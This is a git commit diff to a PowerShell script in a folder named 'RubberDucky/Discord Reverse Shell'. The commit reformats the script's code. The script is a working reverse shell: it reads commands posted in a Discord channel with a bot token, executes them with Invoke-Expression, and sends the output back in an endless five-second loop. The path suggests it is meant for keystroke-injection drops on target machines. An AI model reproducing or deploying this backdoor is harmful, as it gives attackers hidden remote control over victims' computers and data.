bcfd4a2308367e423d129e73bbc4b8362766e0a9
colepez <168139755+colepez@users.noreply.github.com>
2025-04-14 00:45:38 -0400

    Update Discord.Ps1

--- RubberDucky/Discord Reverse Shell/Discord.ps1
+++ RubberDucky/Discord Reverse Shell/Discord.ps1
@@ -3,29 +3,34 @@ param (
     [string]$ChannelID
 )
 
-$Header = @{Authorization = "Bot $Token"}
+$Header = @{ Authorization = "Bot $Token" }
 $BaseURL = "https://discord.com/api/v10/channels/$ChannelID/messages"
 
-function Send-DiscordMessage($msg) {
-    $body = @{content = $msg} | ConvertTo-Json -Depth 10
+function Send-DiscordMessage {
+    param (
+        [string]$msg
+    )
+    $body = @{ content = $msg } | ConvertTo-Json -Depth 10
     Invoke-RestMethod -Uri $BaseURL -Method Post -Headers $Header -Body $body -ContentType "application/json"
 }
 
-function Get-LastCommand() {
+function Get-LastCommand {
     $res = Invoke-RestMethod -Uri $BaseURL -Headers $Header -Method Get
     return $res[0].content
 }
 
 $last = ""
+
 while ($true) {
     try {
         $cmd = Get-LastCommand
         if ($cmd -ne $last -and $cmd -notmatch "^!") {
             $output = Invoke-Expression $cmd | Out-String
-            Send-DiscordMessage "```\n$output\n```"
+            Send-DiscordMessage "```\n$output`n```"
             $last = $cmd
         }
-    } catch {
+    }
+    catch {
         Send-DiscordMessage "ERROR: $($_.Exception.Message)"
     }
     Start-Sleep -Seconds 5
